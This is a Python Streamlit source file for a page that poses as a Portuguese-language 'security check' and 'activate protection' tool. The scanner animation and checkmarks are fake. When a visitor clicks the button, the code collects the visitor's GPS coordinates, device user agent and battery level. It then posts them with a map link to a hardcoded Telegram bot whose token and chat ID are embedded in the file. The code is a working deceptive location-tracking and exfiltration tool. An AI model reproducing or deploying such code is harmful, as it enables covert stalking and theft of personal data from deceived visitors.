import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONFIGURAÇÕES TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

# 2. CONFIGURAÇÃO DA PÁGINA E CSS
st.set_page_config(page_title="Sistema de Segurança", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px; border: none;
    }
    </style>
""", unsafe_allow_html=True)

# 3. CAPTURA DE DADOS (DENTRO DO ESTADO DA SESSÃO PARA 1 CLIQUE)
if 'clicado' not in st.session_state:
    st.session_state['clicado'] = False

# Captura modelo e bateria via JS
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_DEVICE')
bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_LEVEL')

# Captura GPS usando component_key para evitar o erro do seu print
loc = get_geolocation(component_key='GPS_STABLE')

# 4. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_esfera = st.empty()

# Mostra o estado de "Wait" ou 4% dependendo do clique
if not st.session_state['clicado']:
    with caixa_esfera.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
else:
    with caixa_esfera.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">Wait...</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 5. LÓGICA DO BOTÃO
if st.button("🔴 ATIVAR PROTEÇÃO"):
    st.session_state['clicado'] = True
    st.rerun()

# Se o botão foi clicado, entra no loop de espera do GPS
if st.session_state['clicado']:
    if loc and 'coords' in loc:
        # Animação de sucesso
        for p in [25, 55, 85, 100]:
            caixa_esfera.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.1)
        
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        # Montagem do relatório completo
        relatorio = (
            f"🛡️ PROTEÇÃO ATIVADA\n\n"
            f"📱 Aparelho: {ua[:50] if ua else 'Desconhecido'}\n"
            f"🔋 Bateria: {bateria if bateria else '--'}%\n"
            f"📍 [LOCALIZAÇÃO NO MAPA]({mapa})"
        )
        
        enviar_telegram(relatorio)
        st.success("✅ Proteção Ativada com Sucesso!")
        st.session_state['clicado'] = False # Reseta para a próxima
        st.stop()
    else:
        # Mensagem de espera caso o GPS demore
        st.warning("⚠️ Aguardando permissão de localização...")
        time.sleep(2)
        st.rerun()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
